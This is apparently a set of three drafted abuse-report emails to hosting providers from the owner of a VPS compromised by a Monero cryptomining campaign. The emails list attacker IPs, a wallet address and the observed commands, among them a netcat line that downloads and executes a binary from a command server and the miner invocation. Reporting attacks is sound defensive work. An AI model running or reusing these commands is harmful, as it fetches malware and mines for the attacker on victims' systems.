# Abuse Reports — Send These Now

---

## Email 1 — To Contabo (Mining Pool Server)
**To:** abuse@contabo.de  
**Subject:** Cryptomining abuse — Server 31.220.80.26

> I am writing to report that server IP **31.220.80.26** (port 3333) hosted on your network is being used as a Monero (XMR) cryptomining pool as part of an active malware campaign.
>
> My VPS (91.98.205.197, hosted at Hetzner) was compromised and a cryptominer was installed that connects to your server at 31.220.80.26:3333 using the following wallet address:
>
> `46RS6nKCGwRhndfpksLJomXuo4dZ7N9Afj3P1vHZxnwoQhHLw4yEzcocy1XseBdAvvb3Avx2o5PDKND8hdcRumi63ix8Ers`
>
> The miner command observed was:
> `/tmp/npm_update -a rx/0 -o 31.220.80.26:3333 -u 46RS6nKCGwRhndfpksLJomXuo4dZ7N9Afj3P1vHZxnwoQhHLw4yEzcocy1XseBdAvvb3Avx2o5PDKND8hdcRumi63ix8Ers.3000_ORDU_XMR -p x --background`
>
> Please investigate and terminate this server immediately.
>
> Evidence available on request.

---

## Email 2 — To HostPapa/ColoCrossing (C2 Server)
**To:** net-abuse-global@hostpapa.com, abuse@colocrossing.com  
**Subject:** Malware C2 server — IP 107.175.89.136

> Server IP **107.175.89.136** hosted on your network is operating as a Command & Control (C2) server distributing cryptominer malware.
>
> My VPS was compromised by malware that repeatedly connects to 107.175.89.136:9009 via netcat to download and execute miner binaries. The connection pattern observed:
>
> `nc 107.175.89.136 9009 > /tmp/let; chmod 711 /tmp/let; /tmp/let &`
>
> This has been ongoing since at least April 15, 2026. The malware uses Monero wallet:
> `46RS6nKCGwRhndfpksLJomXuo4dZ7N9Afj3P1vHZxnwoQhHLw4yEzcocy1XseBdAvvb3Avx2o5PDKND8hdcRumi63ix8Ers`
>
> Please terminate this server and preserve logs for law enforcement.

---

## Email 3 — To Hetzner (your own provider)
**To:** abuse@hetzner.com  
**Subject:** My server 91.98.205.197 was compromised — requesting assistance

> My Hetzner server (IP 91.98.205.197) has been compromised by a cryptomining malware campaign. The attacker installed persistent malware that connects to C2 server 107.175.89.136:9009 and mining pool 31.220.80.26:3333.
>
> I have cleaned the server multiple times but the malware persists. I would appreciate:
> 1. Network-level blocking of 107.175.89.136 and 31.220.80.26
> 2. Any logs you have of the initial compromise
> 3. Guidance on whether a server rebuild is recommended
>
> Monero wallet used: `46RS6nKCGwRhndfpksLJomXuo4dZ7N9Afj3P1vHZxnwoQhHLw4yEzcocy1XseBdAvvb3Avx2o5PDKND8hdcRumi63ix8Ers`
